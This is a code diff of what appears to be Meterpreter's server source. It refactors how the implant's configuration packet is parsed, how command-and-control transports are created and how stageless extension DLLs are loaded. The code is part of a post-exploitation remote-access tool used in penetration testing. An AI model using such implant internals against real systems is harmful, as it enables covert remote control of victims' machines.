@@ -66,13 +66,13 @@ DWORD server_sessionid()
  * @param fd The socket descriptor passed to metsrv during intialisation.
  * @return Pointer to the end of the configuration.
  */
-VOID load_stageless_extensions(Remote* remote, Packet* configPacket, Tlv* configTlv)
+VOID load_stageless_extensions(Remote* remote, Packet* configPacket)
 {
 	DWORD index = 0;
 	Tlv extensionTlv = { 0 };
 
 	// start by loading the extensions before doing any init scripts
-	while (packet_enum_group_tlv(configPacket, configTlv, index, TLV_TYPE_EXTENSION, &extensionTlv) == ERROR_SUCCESS)
+	while (packet_enum_tlv(configPacket, index, TLV_TYPE_EXTENSION, &extensionTlv) == ERROR_SUCCESS)
 	{
 		DWORD dllSize = 0;
 		LPBYTE dll = packet_get_tlv_group_entry_value_raw(configPacket, &extensionTlv, TLV_TYPE_DATA, &dllSize);
@@ -87,7 +87,7 @@ VOID load_stageless_extensions(Remote* remote, Packet* configPacket, Tlv* config
 
 	// then iterate again and initialise those that require it.
 	index = 0;
-	while (packet_enum_group_tlv(configPacket, configTlv, index, TLV_TYPE_EXTENSION, &extensionTlv) == ERROR_SUCCESS)
+	while (packet_enum_tlv(configPacket, index, TLV_TYPE_EXTENSION, &extensionTlv) == ERROR_SUCCESS)
 	{
 		DWORD initSize = 0;
 		PCHAR init = packet_get_tlv_group_entry_value_string(configPacket, &extensionTlv, TLV_TYPE_STRING, &initSize);
@@ -190,12 +190,12 @@ static void remove_transport(Remote* remote, Transport* oldTransport)
 	oldTransport->transport_destroy(oldTransport);
 }
 
-static BOOL create_transports(Remote* remote, Packet* packet, Tlv* groupTlv, LPDWORD parsedSize)
+static BOOL create_transports(Remote* remote, Packet* packet)
 {
 	DWORD index = 0;
 	Tlv c2Tlv = { 0 };
 
-	while (packet_enum_group_tlv(packet, groupTlv, index, TLV_TYPE_C2, &c2Tlv) == ERROR_SUCCESS)
+	while (packet_enum_tlv(packet, index, TLV_TYPE_C2, &c2Tlv) == ERROR_SUCCESS)
 	{
 		create_transport(remote, packet, &c2Tlv);
 		++index;
@@ -206,6 +206,7 @@ static BOOL create_transports(Remote* remote, Packet* packet, Tlv* groupTlv, LPD
 
 static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LPDWORD size)
 {
+	// TODO OJ: fill this in when the rest is done.
 #ifdef FDJSKL
 	// This function is really only used for migration purposes.
 	DWORD s = sizeof(MetsrvSession);
@@ -221,8 +222,8 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 	memcpy(sess->session_guid, remote->orig_config->session.session_guid, sizeof(GUID));
 #ifdef DEBUGTRACE
 	memcpy(sess->log_path, remote->orig_config->session.log_path, LOG_PATH_SIZE);
-
 #endif
+
 	if (remote->sess_expiry_end)
 	{
 		sess->expiry = remote->sess_expiry_end - current_unix_timestamp();
@@ -256,6 +257,7 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
 			dprintf("[CONFIG] Comms handle set to %p", (UINT_PTR)sess->comms_handle.handle);
 		}
 
+		// TODO: switch this to use the new transport->write_config function
 		switch (t->type)
 		{
 			case METERPRETER_TRANSPORT_TCP:
@@ -300,20 +302,21 @@ static void config_create(Remote* remote, LPBYTE uuid, MetsrvConfig** config, LP
  * @param fd The original socket descriptor passed in from the stager, or a pointer to stageless extensions.
  * @return Meterpreter exit code (ignored by the caller).
  */
-DWORD server_setup(MetsrvConfig* config, Packet* configPacket, Tlv* configTlv)
+DWORD server_setup(MetsrvConfig* config, Packet* configPacket)
 {
+	dprintf("[SERVER] server_setup running");
+
 	THREAD* serverThread = NULL;
 	Remote* remote = NULL;
 	char stationName[256] = { 0 };
 	char desktopName[256] = { 0 };
 	DWORD res = 0;
 
-	UINT sessionExpiry = packet_get_tlv_group_entry_value_uint(configPacket, configTlv, TLV_TYPE_SESSION_EXPIRY);
-	DWORD uuidSize = 0;
-	PBYTE uuid = packet_get_tlv_group_entry_value_raw(configPacket, configTlv, TLV_TYPE_UUID, &uuidSize);
-	PBYTE sessionGuid = packet_get_tlv_group_entry_value_raw(configPacket, configTlv, TLV_TYPE_SESSION_GUID, NULL);
+	UINT sessionExpiry = packet_get_tlv_value_uint(configPacket, TLV_TYPE_SESSION_EXPIRY);
+	dprintf("[SERVER] Expiry: %u", sessionExpiry);
 
-	dprintf("[SESSION] Expiry: %u", sessionExpiry);
+	DWORD uuidSize = 0;
+	PBYTE uuid = packet_get_tlv_value_raw(configPacket, TLV_TYPE_UUID, &uuidSize);
 
 	dprintf("[SERVER] UUID: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
 		uuid[0], uuid[1], uuid[2], uuid[3],
@@ -321,14 +324,16 @@ DWORD server_setup(MetsrvConfig* config, Packet* configPacket, Tlv* configTlv)
 		uuid[8], uuid[9], uuid[10], uuid[11],
 		uuid[12], uuid[13], uuid[14], uuid[15]);
 
-	dprintf("[SERVER] Session GUID: %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
-		sessionGuid[0], sessionGuid[1], sessionGuid[2], sessionGuid[3],
-		sessionGuid[4], sessionGuid[5], sessionGuid[6], sessionGuid[7],
-		sessionGuid[8], sessionGuid[9], sessionGuid[10], sessionGuid[11],
-		sessionGuid[12], sessionGuid[13], sessionGuid[14], sessionGuid[15]);
-
-	memcpy_s(remote->uuid, sizeof(remote->uuid), uuid, uuidSize);
-	memcpy_s(remote->session_guid, sizeof(remote->session_guid), sessionGuid, sizeof(remote->session_guid));
+	DWORD sessionGuidSize = 0;
+	PBYTE sessionGuid = packet_get_tlv_value_raw(configPacket, TLV_TYPE_SESSION_GUID, &sessionGuidSize);
+	if (sessionGuid != NULL)
+	{
+		dprintf("[SERVER] Session GUID: %02X%02X%02X%02X-%02X%02X-%02X%02X-%02X%02X-%02X%02X%02X%02X%02X%02X",
+			sessionGuid[0], sessionGuid[1], sessionGuid[2], sessionGuid[3],
+			sessionGuid[4], sessionGuid[5], sessionGuid[6], sessionGuid[7],
+			sessionGuid[8], sessionGuid[9], sessionGuid[10], sessionGuid[11],
+			sessionGuid[12], sessionGuid[13], sessionGuid[14], sessionGuid[15]);
+	}
 
 	disable_thread_error_reporting();
 
@@ -349,6 +354,12 @@ DWORD server_setup(MetsrvConfig* config, Packet* configPacket, Tlv* configTlv)
 				break;
 			}
 
+			memcpy_s(remote->uuid, sizeof(remote->uuid), uuid, uuidSize);
+			if (sessionGuid != NULL)
+			{
+				memcpy_s(remote->session_guid, sizeof(remote->session_guid), sessionGuid, sizeof(remote->session_guid));
+			}
+
 			remote->sess_expiry_time = sessionExpiry;
 			remote->sess_start_time = current_unix_timestamp();
 			if (remote->sess_expiry_time)
@@ -362,8 +373,7 @@ DWORD server_setup(MetsrvConfig* config, Packet* configPacket, Tlv* configTlv)
 
 			dprintf("[DISPATCH] Session going for %u seconds from %u to %u", remote->sess_expiry_time, remote->sess_start_time, remote->sess_expiry_end);
 
-			DWORD transportSize = 0;
-			if (!create_transports(remote, configPacket, configTlv, &transportSize))
+			if (!create_transports(remote, configPacket))
 			{
 				// not good, bail out!
 				SetLastError(ERROR_BAD_ARGUMENTS);
@@ -390,7 +400,7 @@ DWORD server_setup(MetsrvConfig* config, Packet* configPacket, Tlv* configTlv)
 			register_dispatch_routines();
 			
 			// this has to be done after dispatch routine are registered
-			load_stageless_extensions(remote, configPacket, configTlv);
+			load_stageless_extensions(remote, configPacket);
 
 			// Store our process token
 			if (!OpenThreadToken(remote->server_thread, TOKEN_ALL_ACCESS, TRUE, &remote->server_token))
